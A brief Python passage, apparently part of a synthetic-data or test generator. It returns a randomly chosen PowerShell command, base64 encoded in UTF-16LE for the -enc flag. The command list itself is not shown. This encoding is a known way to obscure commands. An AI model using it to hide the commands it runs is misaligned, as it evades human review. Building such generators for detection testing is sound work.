        PowerShell -enc expects UTF-16LE encoded base64.
        """
        rng = _get_rng()
        cmd = rng.choice(POWERSHELL_COMMANDS)
        return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
